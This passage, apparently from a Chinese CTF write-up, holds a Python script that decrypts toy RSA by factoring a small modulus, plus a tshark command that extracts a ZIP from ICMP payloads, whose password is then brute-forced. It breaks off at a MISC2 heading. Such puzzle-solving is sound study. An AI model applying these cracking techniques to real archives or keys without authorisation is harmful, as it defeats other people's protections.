</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-16>16</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># -*- coding : utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#75715e># __author__ = &#39;https://github.com/findneo&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> gmpy2
</span></span><span style=display:flex><span>n<span style=color:#f92672>=</span><span style=color:#ae81ff>829467319</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 使用yafu离线分解得到p,q</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> <span style=color:#ae81ff>36497</span>
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> <span style=color:#ae81ff>22727</span>
</span></span><span style=display:flex><span>e<span style=color:#f92672>=</span><span style=color:#ae81ff>48357</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>assert</span>(p<span style=color:#f92672>*</span>q<span style=color:#f92672>==</span>n)
</span></span><span style=display:flex><span>phi<span style=color:#f92672>=</span>(p<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>*</span>(q<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>d<span style=color:#f92672>=</span>gmpy2<span style=color:#f92672>.</span>invert(e,phi)
</span></span><span style=display:flex><span>c<span style=color:#f92672>=</span>[<span style=color:#ae81ff>322517722</span>,<span style=color:#ae81ff>575397051</span>,<span style=color:#ae81ff>76525646</span>,<span style=color:#ae81ff>768452152</span>,<span style=color:#ae81ff>107590034</span>,<span style=color:#ae81ff>710690594</span>,<span style=color:#ae81ff>322517722</span>,<span style=color:#ae81ff>174907762</span>,<span style=color:#ae81ff>343945760</span>,<span style=color:#ae81ff>763355610</span>,<span style=color:#ae81ff>301647581</span>,<span style=color:#ae81ff>349705569</span>,<span style=color:#ae81ff>575397051</span>,<span style=color:#ae81ff>76525646</span>,<span style=color:#ae81ff>410109929</span>,<span style=color:#ae81ff>322517722</span>,<span style=color:#ae81ff>497916224</span>,<span style=color:#ae81ff>228868281</span>,<span style=color:#ae81ff>228868281</span>,<span style=color:#ae81ff>741167939</span>,<span style=color:#ae81ff>497916224</span>,<span style=color:#ae81ff>450014050</span>,<span style=color:#ae81ff>322517722</span>,<span style=color:#ae81ff>322517722</span>,<span style=color:#ae81ff>126657310</span>,<span style=color:#ae81ff>349705569</span>,<span style=color:#ae81ff>322517722</span>,<span style=color:#ae81ff>707637171</span>,<span style=color:#ae81ff>76525646</span>,<span style=color:#ae81ff>527107437</span>,<span style=color:#ae81ff>710690594</span>,<span style=color:#ae81ff>685252839</span>,<span style=color:#ae81ff>450014050</span>,<span style=color:#ae81ff>349705569</span>,<span style=color:#ae81ff>388149253</span>,<span style=color:#ae81ff>710690594</span>,<span style=color:#ae81ff>763355610</span>,<span style=color:#ae81ff>211593791</span>,<span style=color:#ae81ff>707637171</span>,<span style=color:#ae81ff>369453331</span>,<span style=color:#ae81ff>228868281</span>,<span style=color:#ae81ff>541631545</span>,<span style=color:#ae81ff>397988536</span>,<span style=color:#ae81ff>322517722</span>,<span style=color:#ae81ff>12982396</span>,<span style=color:#ae81ff>107590034</span>,<span style=color:#ae81ff>387385119</span>,<span style=color:#ae81ff>322517722</span>,<span style=color:#ae81ff>685252839</span>,<span style=color:#ae81ff>710690594</span>,<span style=color:#ae81ff>322517722</span>,<span style=color:#ae81ff>109170298</span>,<span style=color:#ae81ff>349705569</span>,<span style=color:#ae81ff>763355610</span>,<span style=color:#ae81ff>349705569</span>,<span style=color:#ae81ff>349705569</span>,<span style=color:#ae81ff>37195518</span>,<span style=color:#ae81ff>25028382</span>,<span style=color:#ae81ff>610867628</span>,<span style=color:#ae81ff>44896265</span>,<span style=color:#ae81ff>25028382</span>,<span style=color:#ae81ff>454683367</span>,<span style=color:#ae81ff>15283689</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>s<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(map(<span style=color:#66d9ef>lambda</span> ci:chr(pow(ci,d,n)),c))
</span></span><span style=display:flex><span>print(s) <span style=color:#75715e># _stIwn_:!oAestN_rii.ra__}e_gt8nuae1nolg0iYf_2w{_un_CeoeeEhychST</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=9d91a37f2bde50069.png alt></p><h2 id=misc>MISC<a hidden class=anchor aria-hidden=true href=#misc>#</a></h2><h3 id=misc1>MISC1<a hidden class=anchor aria-hidden=true href=#misc1>#</a></h3><p>部分ICMP包DATA字段携带数据，且逐字节为504B&mldr;，很显然是个压缩包，使用命令行工具tshark提取对应字段。</p><p>tshark用法参考<code>tshark --help</code> 或 <a href=https://www.cnblogs.com/liun1994/p/6142505.html>Wireshark命令行工具tshark使用小记</a> 。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-15>15</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ tshark -r pcapng.pcapng  -Y <span style=color:#e6db74>&#34;icmp and icmp.ident==0x930a&#34;</span>  -T fields -e data | xxd -r -p &gt; flag.zip <span style=color:#f92672>&amp;&amp;</span> xxd flag.zip
</span></span><span style=display:flex><span>00000000: 504b <span style=color:#ae81ff>0304</span> <span style=color:#ae81ff>1400</span> <span style=color:#ae81ff>0100</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0386</span> 584d 2a17  PK..........XM*.
</span></span><span style=display:flex><span>00000010: fbf2 <span style=color:#ae81ff>3200</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>2600</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0800</span> <span style=color:#ae81ff>0000</span> 666c  ..2...&amp;.......fl
</span></span><span style=display:flex><span>00000020: <span style=color:#ae81ff>6167</span> 2e74 <span style=color:#ae81ff>7874</span> c541 e340 943c a98d fc66  ag.txt.A.@.&lt;...f
</span></span><span style=display:flex><span>00000030: 952e 0ffe 9ff3 <span style=color:#ae81ff>8797</span> <span style=color:#ae81ff>7647</span> b934 6d3d 8d3d  ........vG.4m<span style=color:#f92672>=</span>.<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>00000040: b94c fc2d cb14 16f3 723a ab5c 5e7f <span style=color:#ae81ff>0903</span>  .L.-....r:.<span style=color:#ae81ff>\^</span>...
</span></span><span style=display:flex><span>00000050: 64ea 7b5b 1ae0 1a4c 504b <span style=color:#ae81ff>0102</span> 3f00 <span style=color:#ae81ff>1400</span>  d.<span style=color:#f92672>{[</span>...LPK..?...
</span></span><span style=display:flex><span>00000060: <span style=color:#ae81ff>0100</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0386</span> 584d 2a17 fbf2 <span style=color:#ae81ff>3200</span> <span style=color:#ae81ff>0000</span>  ......XM*...2...
</span></span><span style=display:flex><span>00000070: <span style=color:#ae81ff>2600</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0800</span> <span style=color:#ae81ff>2400</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>2000</span>  &amp;.....$....... .
</span></span><span style=display:flex><span>00000080: <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> 666c <span style=color:#ae81ff>6167</span> 2e74 <span style=color:#ae81ff>7874</span> 0a00  ......flag.txt..
</span></span><span style=display:flex><span>00000090: <span style=color:#ae81ff>2000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0100</span> <span style=color:#ae81ff>1800</span> cee8 7c47 766b   ...........|Gvk
</span></span><span style=display:flex><span>000000a0: d401 7d2d ec42 766b d401 7d2d ec42 766b  ..<span style=color:#f92672>}</span>-.Bvk..<span style=color:#f92672>}</span>-.Bvk
</span></span><span style=display:flex><span>000000b0: d401 504b <span style=color:#ae81ff>0506</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0100</span> <span style=color:#ae81ff>0100</span> 5a00  ..PK..........Z.
</span></span><span style=display:flex><span>000000c0: <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>5800</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0050</span>                 ..X......P
</span></span><span style=display:flex><span>neo@u:/mnt/d/cwd/bailu/mis1$
</span></span></code></pre></td></tr></table></div></div><p>使用ziperello爆破密码为q，得到<code>flag{d27ca49cb6f5583ae9f3bb2ec38190de}</code> 。</p><h3 id=misc2>MISC2<a hidden class=anchor aria-hidden=true href=#misc2>#</a></h3><h4 id=problem-2>problem<a hidden class=anchor aria-hidden=true href=#problem-2>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-1>  1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-2>  2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-3>  3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-4>  4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-5>  5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-6>  6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-7>  7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-8>  8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-9>  9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-10> 10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-11> 11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-12> 12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-13> 13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-14> 14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-15> 15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-16> 16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-17> 17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-18> 18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-19> 19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-20> 20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-21> 21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-22> 22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-23> 23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-24> 24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-25> 25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-26> 26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-27> 27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-28> 28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-29> 29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-30> 30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-31> 31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-32> 32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-33> 33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-34> 34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-35> 35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-36> 36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-37> 37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-38> 38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-39> 39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-40> 40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-41> 41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-42> 42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-43> 43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-44> 44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-45> 45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-46> 46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-47> 47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-48> 48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-49> 49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-50> 50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-51> 51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-52> 52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-53> 53</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-54><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-54> 54</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-55><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-55> 55</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-56><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-56> 56</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-57><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-57> 57</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-58><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-58> 58</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-59><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-59> 59</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-60><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-60> 60</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-61><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-61> 61</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-62><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-62> 62</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-63><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-63> 63</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-64><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-64> 64</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-65><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-65> 65</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-66><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-66> 66</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-67><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-67> 67</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-68><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-68> 68</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-69><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-69> 69</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-70><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-70> 70</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-71><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-71> 71</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-72><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-72> 72</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-73><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-73> 73</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-74><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-74> 74</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-75><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-75> 75</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-76><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-76> 76</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-77><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-77> 77</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-78><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-78> 78</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-79><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-79> 79</a>
